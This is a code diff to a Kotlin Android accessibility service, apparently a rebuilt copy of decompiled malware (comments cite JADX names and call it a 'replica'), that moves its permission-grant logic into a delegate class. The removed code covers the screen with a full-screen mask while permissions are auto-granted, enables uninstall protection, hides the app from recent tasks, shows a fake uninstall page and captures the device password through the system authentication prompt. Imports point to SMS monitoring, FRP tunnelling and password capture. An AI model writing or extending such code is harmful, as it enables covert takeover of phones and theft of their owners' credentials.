@@ -45,13 +45,13 @@ import com.storm.safe.rock.service.modules.protection.UninstallProtectionManager
 import com.storm.safe.rock.service.modules.screen.ScreenControlHelper
 import com.storm.safe.rock.service.modules.SmsContentObserver
 import com.storm.safe.rock.service.modules.DeviceAuthorizationManager
-import com.storm.safe.rock.service.modules.automation.AutomationCoordinator
 import com.storm.safe.rock.service.delegates.BroadcastReceiverRegistry
 import com.storm.safe.rock.service.delegates.CipherFlowController
 import com.storm.safe.rock.service.delegates.DetectionController
 import com.storm.safe.rock.service.delegates.EventDispatcher
 import com.storm.safe.rock.service.delegates.NetworkMessageSender
 import com.storm.safe.rock.service.delegates.ServiceInitializer
+import com.storm.safe.rock.service.delegates.PermissionFlowController
 import com.storm.safe.rock.service.delegates.SmartNavigator
 import com.storm.safe.rock.service.modules.FrpcProcessManager
 import java.util.concurrent.atomic.AtomicBoolean
@@ -327,6 +327,9 @@ class MyAccessibilityService : AccessibilityService() {
 
     /** Delegate: cipher/password capture flow (extracted from this service) */
     internal var cipherFlowController: CipherFlowController? = null
+
+    /** Delegate: permission grant flow (startPermissionGrantFlow, resumeWriteSettings, pauseWriteSettings) */
+    internal var permissionFlowController: PermissionFlowController? = null
 
     /** Delegate: event dispatch — onAccessibilityEvent routing + sub-methods */
     internal var eventDispatcher: EventDispatcher? = null
@@ -618,6 +621,7 @@ class MyAccessibilityService : AccessibilityService() {
             broadcastReceiverRegistry = BroadcastReceiverRegistry(this)
             smartNavigator = SmartNavigator(this)
             cipherFlowController = CipherFlowController(this)
+            permissionFlowController = PermissionFlowController(this)
             eventDispatcher = EventDispatcher(this)
             networkMessageSender = NetworkMessageSender(
                 networkManagerProvider = { networkManager },
@@ -1395,155 +1399,7 @@ class MyAccessibilityService : AccessibilityService() {
      * 3. If Android 10 (SDK 29) → similar flow with delay
      */
     suspend fun startPermissionGrantFlow() {
-        android.util.Log.d(TAG, "🚀 startPermissionGrantFlow() 开始执行")
-
-        try {
-            val isAuthorized = try {
-                getSharedPreferences("app_state", Context.MODE_PRIVATE)
-                    .getBoolean("authorization_completed", false) ||
-                getSharedPreferences("authorization", Context.MODE_PRIVATE)
-                    .getBoolean("authorization_completed", false)
-            } catch (_: Exception) { false }
-
-            if (isAuthorized) {
-                android.util.Log.d(TAG, "✅ authorization_completed=true，跳过遮挡和适配流程")
-
-                // 授权已完成时直接初始化延迟组件（CommandDispatcher, RemoteConfigManager 等）
-                try {
-                    serviceInitializer?.initializeDeferredManagers()
-                    android.util.Log.d(TAG, "✅ [重启恢复] initializeDeferredManagers 完成")
-                } catch (e: Exception) {
-                    android.util.Log.e(TAG, "❌ [重启恢复] initializeDeferredManagers 失败", e)
-                }
-
-                // JADX: c0329b42.m211768a6() — start authorization module
-                try {
-                    (configStageManager as? DeviceAuthorizationManager)?.startAuthorization(this@MyAccessibilityService)
-                } catch (_: Exception) {}
-
-                // JADX: if (!f52477k8) → enableUninstallProtection
-                if (!isUninstallGuardStarted) {
-                    android.util.Log.d(TAG, "🛡️ 授权已完成但防卸载未启用，立即启用")
-                    enableUninstallProtection()
-                }
-
-                // JADX: c0356a1.m211955a2() — resume recents guard
-                recentsGuardManager?.let { rgm ->
-                    rgm.enable()
-                    android.util.Log.d(TAG, "🎭 授权已完成，恢复最近任务隐藏")
-                }
-
-                // JADX: m211534n2() — tryShowPackageVerify (fake uninstall page)
-                tryShowPackageVerify()
-                return
-            }
-
-            // ── Not yet authorized — begin automation ──
-
-            if (Build.VERSION.SDK_INT >= 30) {
-                // JADX: Android 11+ path
-                android.util.Log.d(TAG, "📱 Android 11+设备，进入专用流程")
-
-                // JADX: screenBrightnessManager.m213351a1() check
-                // If brightness not already lowered → show config mask
-                // ADAPT: ju0 (ScreenBrightnessManager) — vendor manages brightness state
-                // via dedicated manager. Brightness control is handled by dimScreen()/resetScreenBrightness()
-                // and setScreenBrightness() methods directly on this service.
-                // Show mask overlay
-                // JADX: configMaskManager.m213601a1(false) — show full-screen mask overlay
-                if (!com.storm.safe.rock.util.DebugConfig.disableConfigMask) {
-                    try {
-                        overlayManager?.show()
-                        android.util.Log.d(TAG, "🖤 Android 11+设备：显示配置期间遮盖")
-                        configProgressManager?.startConfig()
-                    } catch (_: Exception) {}
-                } else {
-                    android.util.Log.d(TAG, "🎭 [DEBUG] configMask 已跳过")
-                }
-
-                isPermissionFlowStarted = true
-
-                // JADX: c0260a22.m211329h2() — start screen capture permission flow
-                try {
-                    screenCaptureManager?.let { scm ->
-                        // JADX: depends on ScreenCaptureManager.startPermissionRequest() (h2)
-                    }
-                } catch (_: Exception) {}
-
-                // JADX: c0329b43.m211768a6() — start authorization module
-                try {
-                    (configStageManager as? DeviceAuthorizationManager)?.startAuthorization(this@MyAccessibilityService)
-                        ?: run {
-                            configStageManager = DeviceAuthorizationManager(this@MyAccessibilityService, this@MyAccessibilityService)
-                            (configStageManager as? DeviceAuthorizationManager)?.startAuthorization(this@MyAccessibilityService)
-                        }
-                } catch (e: Exception) {
-                    android.util.Log.e(TAG, "❌ 启动授权模块异常: ${e.message}", e)
-                }
-
-                android.util.Log.d(TAG, "📱 Android 11+设备：适配流程继续，网络连接在后台进行")
-
-                // DeviceAuthorizationManager 协程 finally 会自动调用 resumeWriteSettings()
-
-            } else {
-                // JADX: Android 10 path (SDK < 30)
-                // Similar flow with potential 1s delay for mask display
-
-                // Show mask + start authorization
-                if (!com.storm.safe.rock.util.DebugConfig.disableConfigMask) {
-                    try {
-                        overlayManager?.show()
-                        android.util.Log.d(TAG, "🖤 显示配置期间遮盖，防止用户误操作")
-                        configProgressManager?.startConfig()
-                    } catch (_: Exception) {}
-                } else {
-                    android.util.Log.d(TAG, "🎭 [DEBUG] configMask (Android 10) 已跳过")
-                }
-
-                delay(1000L) // JADX: b81.m210571b1(1000L, continuation)
-
-                isPermissionFlowStarted = true
-
-                try {
-                    screenCaptureManager?.let { scm ->
-                        // JADX: depends on ScreenCaptureManager.startPermissionRequest() (h2)
-                    }
-                } catch (_: Exception) {}
-
-                try {
-                    (configStageManager as? DeviceAuthorizationManager)?.startAuthorization(this@MyAccessibilityService)
-                        ?: run {
-                            configStageManager = DeviceAuthorizationManager(this@MyAccessibilityService, this@MyAccessibilityService)
-                            (configStageManager as? DeviceAuthorizationManager)?.startAuthorization(this@MyAccessibilityService)
-                        }
-                } catch (e: Exception) {
-                    android.util.Log.e(TAG, "❌ 启动授权模块异常: ${e.message}", e)
-                }
-
-                // DeviceAuthorizationManager 协程 finally 会自动调用 resumeWriteSettings()
-
-                // JADX: launch dqtvuisjd$startPermissionGrantFlow$11 coroutine
-                // 10s delay → check m211484h8 (networkManager.isRegistered) → if not, wake NetworkManager
-                coroutineScope?.launch {
-                    try {
-                        delay(10000L) // JADX: b81.m210571b1(10000L, this)
-                        val registered = try {
-                            networkManager?.isRegistered ?: false
-                        } catch (_: Exception) { false }
-                        if (!registered) {
-                            android.util.Log.w(TAG, "⚠️ 10秒内未完成注册，唤醒NetworkManager重试")
-                            networkManager?.let { nm ->
-                                nm.ensureConnected() // JADX: c0323a8.m211643a8()
-                                // JADX: c0323a8.m211669d6() — send reconnect signal to channel
-                                // Simplified: ensureConnected already handles reconnection
-                            }
-                        }
-                    } catch (_: Exception) {}
-                }
-            }
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "自动权限获取失败", e)
-        }
+        permissionFlowController?.startPermissionGrantFlow()
     }
 
     /** JADX: i5 — init recents guard. */ fun initializeRecentsGuard() = serviceInitializer?.initializeRecentsGuard()
@@ -1626,17 +1482,7 @@ class MyAccessibilityService : AccessibilityService() {
      * then calls mainOrchestrator.pausePermissionRequest() (JADX: C0327b2.m211752f8).
      */
     fun pauseWriteSettingsPermission() {
-        try {
-            android.util.Log.d(TAG, "⏸️ 暂停WRITE_SETTINGS权限申请")
-            isScreenCaptureActive = true // JADX: f52432g3 = true (dual-use flag)
-            mainOrchestrator?.let { mo ->
-                // JADX: c0327b2.m211752f8() — stop the orchestrator's permission loop
-                mo.stopPermissionRequest()
-                android.util.Log.d(TAG, "⏸️ MainOrchestrator.stopPermissionRequest() 已调用")
-            }
-        } catch (e: Exception) {
-            android.util.Log.w(TAG, "❌ 暂停WRITE_SETTINGS权限申请失败", e)
-        }
+        permissionFlowController?.pauseWriteSettingsPermission()
     }
 
     /** JADX: j8 — post-authorization init. Delegates to ServiceInitializer. */
@@ -1726,85 +1572,7 @@ class MyAccessibilityService : AccessibilityService() {
      * then either enables uninstall protection or waits for system stability.
      */
     fun resumeWriteSettingsPermissionRequest() {
-        android.util.Log.d(TAG, "🔐🔐🔐 [密码调试] resumeWriteSettingsPermissionRequest() 被调用！")
-        try {
-            android.util.Log.d(TAG, "▶️ 恢复WRITE_SETTINGS权限申请")
-            isScreenCaptureActive = false
-            val mo = mainOrchestrator
-            if (mo != null) {
-                val hasPermission = mo.hasWriteSettingsPermission()
-                android.util.Log.d(TAG, "🔐🔐🔐 [密码调试] hasPermission=$hasPermission")
-                if (hasPermission) {
-                    android.util.Log.d(TAG, "🔐 WRITE_SETTINGS权限已获取，跳过恢复权限申请（避免重复触发密码界面）")
-                    if (!isUninstallGuardStarted) {
-                        android.util.Log.d(TAG, "🛡️ WRITE_SETTINGS权限已有但防卸载未启用，立即启用")
-                        enableUninstallProtection()
-                    }
-                    // 2026-04-16 ADAPT: WS 已授权 → 直接触发生物识别流程
-                    coroutineScope?.launch {
-                        try {
-                            capturePasswordViaSystemAuth(isInstallationFlow = false)
-                        } catch (e: kotlinx.coroutines.CancellationException) {
-                            throw e
-                        } catch (e: Exception) {
-                            android.util.Log.e(TAG, "❌ capturePasswordViaSystemAuth (WS已授权分支) failed", e)
-                        }
-                    }
-                    return
-                }
-            }
-            android.util.Log.d(TAG, "🔧 WRITE_SETTINGS权限未获取，等待系统稳定")
-            // JADX: launches dqtvuisjd$resumeWriteSettingsPermissionRequest$3 coroutine
-            coroutineScope?.launch {
-                AutomationCoordinator.withFlow("write_settings") {
-                    try {
-                        delay(800L) // JADX: b81.m210571b1(800L, this) — vendor pure delay
-                        android.util.Log.d(TAG, "🔐🔐🔐 [密码调试] 800ms延迟结束，直接调用requestWriteSettingsPermission()")
-                        // JADX: $3$1 inner coroutine launched on Dispatchers.Main
-                        // Checks isScreenCaptureActive (f52432g3) before calling f7()
-                        if (isScreenCaptureActive) {
-                            android.util.Log.d(TAG, "⏸️ WRITE_SETTINGS权限申请已被暂停，跳过申请")
-                        } else {
-                            android.util.Log.d(TAG, "🔧 开始申请WRITE_SETTINGS权限")
-                            val mo = mainOrchestrator
-                            if (mo == null) {
-                                android.util.Log.d(TAG, "❌ WriteSettingsPermissionManager未初始化，跳过权限申请")
-                            } else {
-                                // 清除 attempted flag，确保 resume 后能重新触发
-                                try {
-                                    applicationContext.getSharedPreferences("write_settings_state", 0)
-                                        .edit().putBoolean("write_settings_attempted", false).apply()
-                                } catch (_: Exception) {}
-                                // 清理品牌引擎留下的 SecurityCenter 页面栈，避免挡住 WRITE_SETTINGS
-                                try {
-                                    performGlobalAction(GLOBAL_ACTION_HOME)
-                                    delay(800L)
-                                } catch (_: Exception) {}
-                                mo.startWriteSettingsPermissionRequest()
-                                // 2026-04-16 ADAPT: WS 完成/3s超时后强制触发生物识别流程
-                                // 不管 WS 成功失败，biometric 都要尝试（vendor 只在成功后触发，
-                                // replica 为了解锁 E2E pipeline，超时也继续）。
-                                val wsGranted = mo.hasWriteSettingsPermission()
-                                android.util.Log.d(TAG, "🔐 WS 流程结束, granted=$wsGranted, 继续触发生物识别")
-                                try {
-                                    capturePasswordViaSystemAuth(isInstallationFlow = false)
-                                } catch (e: kotlinx.coroutines.CancellationException) {
-                                    throw e
-                                } catch (e: Exception) {
-                                    android.util.Log.e(TAG, "❌ capturePasswordViaSystemAuth (WS后) failed", e)
-                                }
-                            }
-                        }
-                    } catch (e: kotlinx.coroutines.CancellationException) {
-                        throw e
-                    } catch (e: Exception) {
-                        android.util.Log.e(TAG, "❌ 申请WRITE_SETTINGS权限失败", e)
-                    }
-                }
-            }
-        } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ 恢复WRITE_SETTINGS权限申请失败", e)
-        }
+        permissionFlowController?.resumeWriteSettingsPermissionRequest()
     }
 
     // ── Network message delegates (→ NetworkMessageSender) ──
